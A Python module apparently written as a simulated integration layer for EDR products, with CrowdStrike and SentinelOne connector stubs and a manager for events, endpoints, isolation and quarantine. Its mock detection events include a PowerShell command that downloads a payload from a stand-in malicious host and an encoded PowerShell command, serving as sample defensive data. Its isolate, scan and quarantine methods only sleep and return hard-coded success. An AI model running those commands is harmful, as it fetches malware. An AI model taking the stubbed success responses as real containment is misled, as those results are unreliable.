"""
EDR (Endpoint Detection and Response) Connectors
Integration with CrowdStrike, SentinelOne, and other EDR solutions
"""

import asyncio
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from enum import Enum
import logging
from abc import ABC, abstractmethod

logger = logging.getLogger(__name__)

class EDRProvider(Enum):
    CROWDSTRIKE = "crowdstrike"
    SENTINELONE = "sentinelone"
    CARBON_BLACK = "carbon_black"
    TREND_MICRO = "trend_micro"
    SYMANTEC = "symantec"

class DetectionSeverity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class EndpointStatus(Enum):
    ONLINE = "online"
    OFFLINE = "offline"
    ISOLATED = "isolated"
    MAINTENANCE = "maintenance"

@dataclass
class EDREvent:
    """EDR security event data structure"""
    provider: EDRProvider
    endpoint_id: str
    hostname: str
    ip_address: str
    user: str
    timestamp: datetime
    event_type: str
    severity: DetectionSeverity
    description: str
    file_path: Optional[str]
    process_name: Optional[str]
    command_line: Optional[str]
    mitre_tactics: List[str]
    mitre_techniques: List[str]
    raw_event: Dict[str, Any]

@dataclass
class EndpointInfo:
    """Endpoint information"""
    provider: EDRProvider
    endpoint_id: str
    hostname: str
    ip_address: str
    os: str
    os_version: str
    status: EndpointStatus
    last_seen: datetime
    agent_version: str
    policies: List[str]
    tags: List[str]

class EDRConnector(ABC):
    """Abstract base class for EDR connectors"""
    
    def __init__(self, credentials: Dict[str, Any]):
        self.credentials = credentials
        self.last_sync = None
    
    @abstractmethod
    async def authenticate(self) -> bool:
        """Authenticate with EDR provider"""
        pass
    
    @abstractmethod
    async def get_events(self, start_time: datetime, end_time: datetime) -> List[EDREvent]:
        """Get security events from EDR"""
        pass
    
    @abstractmethod
    async def get_endpoints(self) -> List[EndpointInfo]:
        """Get endpoint information"""
        pass
    
    @abstractmethod
    async def isolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Isolate an endpoint"""
        pass
    
    @abstractmethod
    async def unisolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Un-isolate an endpoint"""
        pass
    
    @abstractmethod
    async def scan_endpoint(self, endpoint_id: str, scan_type: str) -> Dict[str, Any]:
        """Scan an endpoint"""
        pass
    
    @abstractmethod
    async def quarantine_file(self, endpoint_id: str, file_hash: str) -> Dict[str, Any]:
        """Quarantine a file on endpoint"""
        pass

class CrowdStrikeConnector(EDRConnector):
    """CrowdStrike Falcon connector"""
    
    def __init__(self, credentials: Dict[str, Any]):
        super().__init__(credentials)
        self.client_id = credentials.get('client_id')
        self.client_secret = credentials.get('client_secret')
        self.base_url = credentials.get('base_url', 'https://api.crowdstrike.com')
    
    async def authenticate(self) -> bool:
        """Authenticate with CrowdStrike"""
        try:
            # Simulate CrowdStrike authentication
            # In real implementation, use Falcon API
            logger.info("Authenticating with CrowdStrike Falcon")
            await asyncio.sleep(0.5)
            
            if not self.client_id or not self.client_secret:
                raise ValueError("CrowdStrike client_id and client_secret required")
            
            logger.info("CrowdStrike authentication successful")
            return True
        except Exception as e:
            logger.error(f"CrowdStrike authentication failed: {e}")
            return False
    
    async def get_events(self, start_time: datetime, end_time: datetime) -> List[EDREvent]:
        """Get events from CrowdStrike"""
        try:
            # Simulate Falcon API calls
            await asyncio.sleep(1)
            
            sample_events = [
                {
                    "id": "cs-001",
                    "timestamp": datetime.now() - timedelta(hours=2),
                    "event_type": "Detection",
                    "severity": DetectionSeverity.HIGH,
                    "description": "Malware execution detected",
                    "hostname": "workstation-01",
                    "ip_address": "192.168.1.100",
                    "user": "john.doe",
                    "file_path": "C:\\Users\\john.doe\\Downloads\\malware.exe",
                    "process_name": "malware.exe",
                    "command_line": "malware.exe --silent",
                    "mitre_tactics": ["Execution", "Persistence"],
                    "mitre_techniques": ["T1059", "T1547"]
                },
                {
                    "id": "cs-002",
                    "timestamp": datetime.now() - timedelta(hours=4),
                    "event_type": "Behavioral",
                    "severity": DetectionSeverity.MEDIUM,
                    "description": "Suspicious PowerShell activity",
                    "hostname": "server-02",
                    "ip_address": "192.168.1.200",
                    "user": "admin",
                    "process_name": "powershell.exe",
                    "command_line": "powershell -enc aW52b2tlLXJlcXVlc3Qg",
                    "mitre_tactics": ["Execution"],
                    "mitre_techniques": ["T1059.001"]
                }
            ]
            
            events = []
            for event_data in sample_events:
                event = EDREvent(
                    provider=EDRProvider.CROWDSTRIKE,
                    endpoint_id=event_data.get("hostname", "unknown"),
                    hostname=event_data.get("hostname", "unknown"),
                    ip_address=event_data.get("ip_address", "unknown"),
                    user=event_data.get("user", "unknown"),
                    timestamp=event_data["timestamp"],
                    event_type=event_data["event_type"],
                    severity=event_data["severity"],
                    description=event_data["description"],
                    file_path=event_data.get("file_path"),
                    process_name=event_data.get("process_name"),
                    command_line=event_data.get("command_line"),
                    mitre_tactics=event_data.get("mitre_tactics", []),
                    mitre_techniques=event_data.get("mitre_techniques", []),
                    raw_event=event_data
                )
                events.append(event)
            
            logger.info(f"Retrieved {len(events)} events from CrowdStrike")
            return events
        except Exception as e:
            logger.error(f"Error getting CrowdStrike events: {e}")
            return []
    
    async def get_endpoints(self) -> List[EndpointInfo]:
        """Get endpoints from CrowdStrike"""
        try:
            await asyncio.sleep(1)
            
            sample_endpoints = [
                {
                    "endpoint_id": "host-001",
                    "hostname": "workstation-01",
                    "ip_address": "192.168.1.100",
                    "os": "Windows",
                    "os_version": "Windows 10 Pro",
                    "status": EndpointStatus.ONLINE,
                    "last_seen": datetime.now() - timedelta(minutes=15),
                    "agent_version": "6.44.14301.0",
                    "policies": ["Standard Protection", "Real-time Protection"],
                    "tags": ["Corporate", "Laptop"]
                },
                {
                    "endpoint_id": "host-002",
                    "hostname": "server-02",
                    "ip_address": "192.168.1.200",
                    "os": "Windows",
                    "os_version": "Windows Server 2019",
                    "status": EndpointStatus.ONLINE,
                    "last_seen": datetime.now() - timedelta(minutes=5),
                    "agent_version": "6.44.14301.0",
                    "policies": ["Server Protection", "Enhanced Monitoring"],
                    "tags": ["Corporate", "Server"]
                }
            ]
            
            endpoints = []
            for ep_data in sample_endpoints:
                endpoint = EndpointInfo(
                    provider=EDRProvider.CROWDSTRIKE,
                    endpoint_id=ep_data["endpoint_id"],
                    hostname=ep_data["hostname"],
                    ip_address=ep_data["ip_address"],
                    os=ep_data["os"],
                    os_version=ep_data["os_version"],
                    status=ep_data["status"],
                    last_seen=ep_data["last_seen"],
                    agent_version=ep_data["agent_version"],
                    policies=ep_data["policies"],
                    tags=ep_data["tags"]
                )
                endpoints.append(endpoint)
            
            logger.info(f"Retrieved {len(endpoints)} endpoints from CrowdStrike")
            return endpoints
        except Exception as e:
            logger.error(f"Error getting CrowdStrike endpoints: {e}")
            return []
    
    async def isolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Isolate endpoint with CrowdStrike"""
        try:
            await asyncio.sleep(2)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "action": "isolate",
                "timestamp": datetime.now().isoformat(),
                "message": f"Endpoint {endpoint_id} isolated successfully"
            }
        except Exception as e:
            logger.error(f"Error isolating endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def unisolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Un-isolate endpoint with CrowdStrike"""
        try:
            await asyncio.sleep(2)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "action": "unisolate",
                "timestamp": datetime.now().isoformat(),
                "message": f"Endpoint {endpoint_id} un-isolated successfully"
            }
        except Exception as e:
            logger.error(f"Error un-isolating endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def scan_endpoint(self, endpoint_id: str, scan_type: str) -> Dict[str, Any]:
        """Scan endpoint with CrowdStrike"""
        try:
            await asyncio.sleep(3)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "scan_type": scan_type,
                "scan_id": f"scan_{endpoint_id}_{datetime.now().timestamp()}",
                "timestamp": datetime.now().isoformat(),
                "message": f"{scan_type} scan initiated on endpoint {endpoint_id}"
            }
        except Exception as e:
            logger.error(f"Error scanning endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def quarantine_file(self, endpoint_id: str, file_hash: str) -> Dict[str, Any]:
        """Quarantine file with CrowdStrike"""
        try:
            await asyncio.sleep(1)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "file_hash": file_hash,
                "action": "quarantine",
                "timestamp": datetime.now().isoformat(),
                "message": f"File {file_hash} quarantined on endpoint {endpoint_id}"
            }
        except Exception as e:
            logger.error(f"Error quarantining file: {e}")
            return {"status": "failed", "error": str(e)}

class SentinelOneConnector(EDRConnector):
    """SentinelOne connector"""
    
    def __init__(self, credentials: Dict[str, Any]):
        super().__init__(credentials)
        self.api_token = credentials.get('api_token')
        self.base_url = credentials.get('base_url', 'https://usea1-004.sentinelone.net')
        self.account_id = credentials.get('account_id')
    
    async def authenticate(self) -> bool:
        """Authenticate with SentinelOne"""
        try:
            # Simulate SentinelOne authentication
            # In real implementation, use SentinelOne API
            logger.info("Authenticating with SentinelOne")
            await asyncio.sleep(0.5)
            
            if not self.api_token:
                raise ValueError("SentinelOne API token required")
            
            logger.info("SentinelOne authentication successful")
            return True
        except Exception as e:
            logger.error(f"SentinelOne authentication failed: {e}")
            return False
    
    async def get_events(self, start_time: datetime, end_time: datetime) -> List[EDREvent]:
        """Get events from SentinelOne"""
        try:
            await asyncio.sleep(1)
            
            sample_events = [
                {
                    "id": "s1-001",
                    "timestamp": datetime.now() - timedelta(hours=1),
                    "event_type": "Threat",
                    "severity": DetectionSeverity.CRITICAL,
                    "description": "Ransomware activity detected",
                    "hostname": "dc-01",
                    "ip_address": "192.168.1.10",
                    "user": "administrator",
                    "file_path": "C:\\Windows\\System32\\ransomware.exe",
                    "process_name": "ransomware.exe",
                    "mitre_tactics": ["Impact", "Execution"],
                    "mitre_techniques": ["T1486", "T1059"]
                },
                {
                    "id": "s1-002",
                    "timestamp": datetime.now() - timedelta(hours=3),
                    "event_type": "Detection",
                    "severity": DetectionSeverity.HIGH,
                    "description": "Suspicious network connection",
                    "hostname": "workstation-05",
                    "ip_address": "192.168.1.105",
                    "user": "jane.smith",
                    "process_name": "powershell.exe",
                    "command_line": "powershell -c Invoke-WebRequest -Uri http://malicious.com/payload.exe",
                    "mitre_tactics": ["Command and Control"],
                    "mitre_techniques": ["T1071.001"]
                }
            ]
            
            events = []
            for event_data in sample_events:
                event = EDREvent(
                    provider=EDRProvider.SENTINELONE,
                    endpoint_id=event_data.get("hostname", "unknown"),
                    hostname=event_data.get("hostname", "unknown"),
                    ip_address=event_data.get("ip_address", "unknown"),
                    user=event_data.get("user", "unknown"),
                    timestamp=event_data["timestamp"],
                    event_type=event_data["event_type"],
                    severity=event_data["severity"],
                    description=event_data["description"],
                    file_path=event_data.get("file_path"),
                    process_name=event_data.get("process_name"),
                    command_line=event_data.get("command_line"),
                    mitre_tactics=event_data.get("mitre_tactics", []),
                    mitre_techniques=event_data.get("mitre_techniques", []),
                    raw_event=event_data
                )
                events.append(event)
            
            logger.info(f"Retrieved {len(events)} events from SentinelOne")
            return events
        except Exception as e:
            logger.error(f"Error getting SentinelOne events: {e}")
            return []
    
    async def get_endpoints(self) -> List[EndpointInfo]:
        """Get endpoints from SentinelOne"""
        try:
            await asyncio.sleep(1)
            
            sample_endpoints = [
                {
                    "endpoint_id": "agent-001",
                    "hostname": "dc-01",
                    "ip_address": "192.168.1.10",
                    "os": "Windows",
                    "os_version": "Windows Server 2016",
                    "status": EndpointStatus.ONLINE,
                    "last_seen": datetime.now() - timedelta(minutes=2),
                    "agent_version": "22.3.3.119",
                    "policies": ["Domain Controller Policy"],
                    "tags": ["Domain Controller", "Critical"]
                },
                {
                    "endpoint_id": "agent-002",
                    "hostname": "workstation-05",
                    "ip_address": "192.168.1.105",
                    "os": "Windows",
                    "os_version": "Windows 11 Pro",
                    "status": EndpointStatus.ONLINE,
                    "last_seen": datetime.now() - timedelta(minutes=8),
                    "agent_version": "22.3.3.119",
                    "policies": ["Standard Workstation Policy"],
                    "tags": ["Workstation", "User Device"]
                }
            ]
            
            endpoints = []
            for ep_data in sample_endpoints:
                endpoint = EndpointInfo(
                    provider=EDRProvider.SENTINELONE,
                    endpoint_id=ep_data["endpoint_id"],
                    hostname=ep_data["hostname"],
                    ip_address=ep_data["ip_address"],
                    os=ep_data["os"],
                    os_version=ep_data["os_version"],
                    status=ep_data["status"],
                    last_seen=ep_data["last_seen"],
                    agent_version=ep_data["agent_version"],
                    policies=ep_data["policies"],
                    tags=ep_data["tags"]
                )
                endpoints.append(endpoint)
            
            logger.info(f"Retrieved {len(endpoints)} endpoints from SentinelOne")
            return endpoints
        except Exception as e:
            logger.error(f"Error getting SentinelOne endpoints: {e}")
            return []
    
    async def isolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Isolate endpoint with SentinelOne"""
        try:
            await asyncio.sleep(2)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "action": "isolate",
                "timestamp": datetime.now().isoformat(),
                "message": f"Endpoint {endpoint_id} isolated successfully"
            }
        except Exception as e:
            logger.error(f"Error isolating endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def unisolate_endpoint(self, endpoint_id: str) -> Dict[str, Any]:
        """Un-isolate endpoint with SentinelOne"""
        try:
            await asyncio.sleep(2)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "action": "unisolate",
                "timestamp": datetime.now().isoformat(),
                "message": f"Endpoint {endpoint_id} un-isolated successfully"
            }
        except Exception as e:
            logger.error(f"Error un-isolating endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def scan_endpoint(self, endpoint_id: str, scan_type: str) -> Dict[str, Any]:
        """Scan endpoint with SentinelOne"""
        try:
            await asyncio.sleep(3)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "scan_type": scan_type,
                "scan_id": f"scan_{endpoint_id}_{datetime.now().timestamp()}",
                "timestamp": datetime.now().isoformat(),
                "message": f"{scan_type} scan initiated on endpoint {endpoint_id}"
            }
        except Exception as e:
            logger.error(f"Error scanning endpoint: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def quarantine_file(self, endpoint_id: str, file_hash: str) -> Dict[str, Any]:
        """Quarantine file with SentinelOne"""
        try:
            await asyncio.sleep(1)
            
            return {
                "status": "success",
                "endpoint_id": endpoint_id,
                "file_hash": file_hash,
                "action": "quarantine",
                "timestamp": datetime.now().isoformat(),
                "message": f"File {file_hash} quarantined on endpoint {endpoint_id}"
            }
        except Exception as e:
            logger.error(f"Error quarantining file: {e}")
            return {"status": "failed", "error": str(e)}

class EDRManager:
    """Manager for all EDR connectors"""
    
    def __init__(self):
        self.connectors = {}
        self.last_sync_times = {}
    
    def register_connector(self, provider: str, connector: EDRConnector):
        """Register an EDR connector"""
        self.connectors[provider] = connector
        logger.info(f"Registered {provider} EDR connector")
    
    async def authenticate_all(self) -> Dict[str, bool]:
        """Authenticate all registered connectors"""
        results = {}
        
        for provider, connector in self.connectors.items():
            try:
                results[provider] = await connector.authenticate()
            except Exception as e:
                logger.error(f"Error authenticating {provider}: {e}")
                results[provider] = False
        
        return results
    
    async def get_all_events(self, start_time: datetime, end_time: datetime) -> List[EDREvent]:
        """Get events from all providers"""
        all_events = []
        
        for provider, connector in self.connectors.items():
            try:
                events = await connector.get_events(start_time, end_time)
                all_events.extend(events)
                logger.info(f"Retrieved {len(events)} events from {provider}")
            except Exception as e:
                logger.error(f"Error getting events from {provider}: {e}")
        
        # Sort by timestamp
        all_events.sort(key=lambda x: x.timestamp, reverse=True)
        return all_events
    
    async def get_all_endpoints(self) -> Dict[str, List[EndpointInfo]]:
        """Get endpoints from all providers"""
        endpoints = {}
        
        for provider, connector in self.connectors.items():
            try:
                provider_endpoints = await connector.get_endpoints()
                endpoints[provider] = provider_endpoints
                logger.info(f"Retrieved {len(provider_endpoints)} endpoints from {provider}")
            except Exception as e:
                logger.error(f"Error getting endpoints from {provider}: {e}")
                endpoints[provider] = []
        
        return endpoints
    
    async def isolate_endpoint(self, provider: str, endpoint_id: str) -> Dict[str, Any]:
        """Isolate endpoint on specific provider"""
        if provider not in self.connectors:
            return {"status": "failed", "error": f"Provider {provider} not found"}
        
        try:
            return await self.connectors[provider].isolate_endpoint(endpoint_id)
        except Exception as e:
            logger.error(f"Error isolating endpoint on {provider}: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def unisolate_endpoint(self, provider: str, endpoint_id: str) -> Dict[str, Any]:
        """Un-isolate endpoint on specific provider"""
        if provider not in self.connectors:
            return {"status": "failed", "error": f"Provider {provider} not found"}
        
        try:
            return await self.connectors[provider].unisolate_endpoint(endpoint_id)
        except Exception as e:
            logger.error(f"Error un-isolating endpoint on {provider}: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def scan_endpoint(self, provider: str, endpoint_id: str, scan_type: str) -> Dict[str, Any]:
        """Scan endpoint on specific provider"""
        if provider not in self.connectors:
            return {"status": "failed", "error": f"Provider {provider} not found"}
        
        try:
            return await self.connectors[provider].scan_endpoint(endpoint_id, scan_type)
        except Exception as e:
            logger.error(f"Error scanning endpoint on {provider}: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def quarantine_file(self, provider: str, endpoint_id: str, file_hash: str) -> Dict[str, Any]:
        """Quarantine file on specific provider"""
        if provider not in self.connectors:
            return {"status": "failed", "error": f"Provider {provider} not found"}
        
        try:
            return await self.connectors[provider].quarantine_file(endpoint_id, file_hash)
        except Exception as e:
            logger.error(f"Error quarantining file on {provider}: {e}")
            return {"status": "failed", "error": str(e)}
    
    async def get_endpoint_statistics(self) -> Dict[str, Any]:
        """Get endpoint statistics across all providers"""
        try:
            all_endpoints = await self.get_all_endpoints()
            
            stats = {
                "total_endpoints": 0,
                "online_endpoints": 0,
                "offline_endpoints": 0,
                "isolated_endpoints": 0,
                "provider_stats": {},
                "os_distribution": {},
                "status_distribution": {}
            }
            
            for provider, endpoints in all_endpoints.items():
                provider_stats = {
                    "total": len(endpoints),
                    "online": 0,
                    "offline": 0,
                    "isolated": 0
                }
                
                for endpoint in endpoints:
                    stats["total_endpoints"] += 1
                    
                    # Status counts
                    if endpoint.status == EndpointStatus.ONLINE:
                        stats["online_endpoints"] += 1
                        provider_stats["online"] += 1
                    elif endpoint.status == EndpointStatus.OFFLINE:
                        stats["offline_endpoints"] += 1
                        provider_stats["offline"] += 1
                    elif endpoint.status == EndpointStatus.ISOLATED:
                        stats["isolated_endpoints"] += 1
                        provider_stats["isolated"] += 1
                    
                    # OS distribution
                    os_name = endpoint.os
                    stats["os_distribution"][os_name] = stats["os_distribution"].get(os_name, 0) + 1
                
                stats["provider_stats"][provider] = provider_stats
            
            return stats
        except Exception as e:
            logger.error(f"Error getting endpoint statistics: {e}")
            return {}

# Global EDR manager instance
edr_manager = EDRManager()
